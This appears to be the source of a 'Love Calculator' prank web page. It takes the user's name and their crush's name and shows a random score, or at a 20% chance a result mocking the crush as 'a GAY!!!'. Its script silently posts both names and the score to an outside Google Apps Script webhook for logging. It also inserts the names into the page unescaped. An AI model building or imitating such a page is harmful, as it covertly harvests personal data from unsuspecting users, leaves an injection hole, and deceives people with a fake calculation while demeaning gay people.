<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>‚ù§Ô∏è Love Calculator ‚ù§Ô∏è</title>
  <style>
    body {
      background: #ffe6f0;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    h1 {
      color: #ff3385;
      font-size: 36px;
    }
    input, button {
      font-size: 18px;
      padding: 10px;
      margin: 10px;
      border: 2px solid #ff3385;
      border-radius: 10px;
    }
    button {
      background-color: #ff3385;
      color: white;
      cursor: pointer;
    }
    #result {
      margin-top: 30px;
      font-size: 26px;
      color: #cc0066;
    }
    #log {
      display: none;
      margin-top: 40px;
      color: #555;
    }
    textarea {
      width: 80%;
      height: 200px;
      font-family: monospace;
    }
  </style>
</head>
<body>

  <h1>‚ù§Ô∏è Love Calculator ‚ù§Ô∏è</h1>

  <form id="loveForm">
    <input type="text" id="yourName" placeholder="Your Name" required><br>
    <input type="text" id="crushName" placeholder="Their Name" required><br>
    <button type="submit">Calculate Love %</button>
  </form>

  <div id="result"></div>



<script>
  const form = document.getElementById("loveForm");
  const resultDiv = document.getElementById("result");

  const webhookURL = "https://script.google.com/macros/s/AKfycbxH4lcWiNdBESfYLKzOi4S93HsVDcYDsuD-4sOUHLdmrhSA1lwc3Wk2GMK1VRSpCkZkSg/exec";

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    const yourName = document.getElementById("yourName").value.trim();
    const crushName = document.getElementById("crushName").value.trim();

    // 20% chance for the "GAY" prank (Math.random() < 0.2)
    const isGayPrank = Math.random() < 0.2;

    let lovePercent, resultText;

    if (isGayPrank) {
      lovePercent = 0;
      resultText = `üíî ${yourName} & ${crushName} are <b>0%</b> in love ‚Äì the person you like is a <b>GAY!!!</b>`;
    } else {
      lovePercent = Math.floor(Math.random() * 51) + 50; // 50‚Äì100%
      resultText = `üíò ${yourName} & ${crushName} are <b>${lovePercent}%</b> in love!`;
    }

    resultDiv.innerHTML = resultText;

    const formData = new URLSearchParams();
    formData.append("yourName", yourName);
    formData.append("crushName", crushName);
    formData.append("lovePercent", lovePercent);

    fetch(webhookURL, {
      method: "POST",
      body: formData
    })
    .then(response => response.text())
    .then(data => console.log("‚úÖ Logged to Sheet:", data))
    .catch(err => console.error("‚ùå Logging failed:", err));
  });
</script>






</body>
</html>
